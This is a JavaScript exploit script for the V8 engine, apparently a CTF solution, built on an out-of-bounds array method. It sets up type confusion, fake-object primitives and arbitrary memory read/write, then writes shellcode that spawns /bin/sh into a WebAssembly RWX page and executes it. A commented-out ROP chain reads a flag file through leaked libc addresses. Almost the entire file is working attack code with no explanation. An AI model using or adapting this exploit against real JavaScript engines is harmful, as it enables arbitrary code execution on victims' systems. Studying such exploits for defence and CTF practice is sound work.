// -----------------------------------------------------------------------------------------------
// ---- int64 <-> double

var overlapping_buf = new ArrayBuffer(0x20);
var for_double_value = new Float64Array(overlapping_buf);
var for_bigint_value = new BigUint64Array(overlapping_buf);

function double_to_int64(double_value) {
    for_double_value[0] = double_value;
    return for_bigint_value[0];
}

function int64_to_double(int64_value) {
    for_bigint_value[0] = int64_value;
    return for_double_value[0];
}

// -----------------------------------------------------------------------------------------------
// ---- type confusion && get object address && treat address as object

var first_object = {"1": 2};
var second_object = [1, 2, 3];

var obj_arr = [first_object, second_object];
var float_arr = [0.1, 0.2, 0.3];

var float_typemap = float_arr.oob();
var obj_typemap = obj_arr.oob();

function get_object_address(object) {           // return BigInt
    obj_arr[0] = object;
    obj_arr.oob(float_typemap);
    let obj_addr = double_to_int64(obj_arr[0]) - 1n;
    obj_arr.oob(obj_typemap);
    return obj_addr;
}

function treat_address_as_object(addr) {        // receive BigInt
    float_arr[0] = int64_to_double(addr + 1n);
    float_arr.oob(obj_typemap);
    let fake_obj = float_arr[0];
    float_arr.oob(float_typemap);
    return fake_obj;
}

var first_object_addr = get_object_address(first_object);

// -----------------------------------------------------------------------------------------------
// ---- R/W anywhere (fake, implemented by float array)

var fake_object_container = [float_typemap, 0, 0, int64_to_double(0x10n * 0x100000000n)];
var container_addr = get_object_address(fake_object_container);
var fake_object = treat_address_as_object(container_addr + 0x30n);

function set_addr_to_rw(addr) {
    fake_object_container[2] = int64_to_double(addr - 0x10n + 1n);
}

function get_rw_addr(idx) {
    return double_to_int64(fake_object_container[2]) - 1n + 0x10n + BigInt(idx) * 8n;
}

function read_addr(addr) {
    set_addr_to_rw(addr);
    return double_to_int64(fake_object[0]);
}

function write_addr(addr, value) {
    set_addr_to_rw(addr);
    fake_object[0] = int64_to_double(value);
}

// -----------------------------------------------------------------------------------------------
// ---- R/W anywhere (real, implemented by BigUint64Array)

var fake_bigint64arr_container = [0.1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0];
for (let off = 0; off < 13; off++) {
    let v = read_addr(get_object_address(for_bigint_value) + BigInt(off) * 8n);
    fake_bigint64arr_container[off] = int64_to_double(v);
}

// change the elements pointer
fake_bigint64arr_container[2] = int64_to_double(get_object_address(fake_bigint64arr_container) - 0x20n + 1n);
// get the heap pointer
heap_addr = double_to_int64(fake_bigint64arr_container[12]);
fake_bigintarr = treat_address_as_object(get_object_address(fake_bigint64arr_container) - 0x68n);

function read_at(addr) {
    fake_bigint64arr_container[12] = int64_to_double(addr);
    return fake_bigintarr[0];
}

function write_at(addr, value) {
    fake_bigint64arr_container[12] = int64_to_double(addr);
    fake_bigintarr[0] = value;
}

// Traditional Exploitation Process:

/*
// -----------------------------------------------------------------------------------------------
// ---- Leaking ELF addr

var typemap = double_to_int64(fake_bigint64arr_container[0]) - 1n;
var constructor = read_at(typemap + 0x20n) - 1n;
var code = read_at(constructor + 0x30n) - 1n;
var elf_code_addr = read_at(code + 0x42n);
var elf_base = elf_code_addr - 0x10274E0n;

// -----------------------------------------------------------------------------------------------
// ---- Leaking Libc addr

var abort_addr = read_at(elf_base + 0x12B4518n);
var libc_base = abort_addr - 0x2641an;
console.log("libc base: 0x" + libc_base.toString(16));
var system_addr = libc_base + 0x4dab0n;
var open_addr = libc_base + 0xfe0d0n;
var read_addr = libc_base + 0xfea10n;
var puts_addr = libc_base + 0x77640n;

// -----------------------------------------------------------------------------------------------
// ---- ROP

var environ = libc_base + 0x3532b0n;
var stack_addr = read_at(environ);
var rop_start = stack_addr - 0xbd0n;
console.log("ROP chain starts at: 0x" + rop_start.toString(16));
var poprdi_ret = libc_base + 0x28215n;
var poprsi_ret = libc_base + 0x29b29n;
var poprdx_ret = libc_base + 0x1085adn;

write_at(stack_addr, 0x67616c66n);       // flag\x00
write_at(rop_start, poprdi_ret);
write_at(rop_start + 8n, stack_addr);
write_at(rop_start + 0x10n, poprsi_ret);
write_at(rop_start + 0x18n, 0n);
write_at(rop_start + 0x20n, open_addr);
write_at(rop_start + 0x28n, poprdi_ret);
write_at(rop_start + 0x30n, 3n);
write_at(rop_start + 0x38n, poprsi_ret);
write_at(rop_start + 0x40n, stack_addr);
write_at(rop_start + 0x48n, poprdx_ret);
write_at(rop_start + 0x50n, 0x40n);
write_at(rop_start + 0x58n, read_addr);
write_at(rop_start + 0x60n, poprdi_ret);
write_at(rop_start + 0x68n, stack_addr);
write_at(rop_start + 0x70n, puts_addr);

console.log("Script is about to end");
*/

// WASM Exploitation Process:

// -----------------------------------------------------------------------------------------------
// ---- Load WASM code

var wasmCode = new Uint8Array(Array.from(read("./demo.wasm"), c => c.charCodeAt(0)));

var wasmModule = new WebAssembly.Module(wasmCode);
var wasmInstance = new WebAssembly.Instance(wasmModule, {});
var f = wasmInstance.exports.c;

// -----------------------------------------------------------------------------------------------
// ---- Get RWX page start

var f_addr = get_object_address(f);
var shared_function_info_addr = read_at(f_addr + 0x18n) - 1n;
var wasm_exported_function_data_addr = read_at(shared_function_info_addr + 0x8n) - 1n;
var wasm_instance_object_addr = read_at(wasm_exported_function_data_addr + 0x10n) - 1n;
var rwx_page_start = read_at(wasm_instance_object_addr + 0x88n)

console.log("Got RWX page start: 0x" + rwx_page_start.toString(16));

// -----------------------------------------------------------------------------------------------
// ---- Fill most of the page with nop instructions

for (let off=0; off <= 0xEF8; off++) {
    write_at(rwx_page_start + BigInt(off), 0x9090909090909090n);    // nop: 0x90
}

// -----------------------------------------------------------------------------------------------
// ---- Write shellcode and execute "WASM code"

var shellcode = [106, 104, 72, 184, 47, 98, 105, 110, 47, 47, 47, 115, 80, 72, 137, 231, 104, 114, 105, 1, 1, 129, 52, 36, 1, 1, 1, 1, 49, 246, 86, 106, 8, 94, 72, 1, 230, 86, 72, 137, 230, 49, 210, 106, 59, 88, 15, 5];

for (let i=0; i < shellcode.length; i++) {
    write_at(rwx_page_start + 0xf00n + BigInt(i), BigInt(shellcode[i]));
}

console.log("Ready to execute shellcode!");
var d = f();
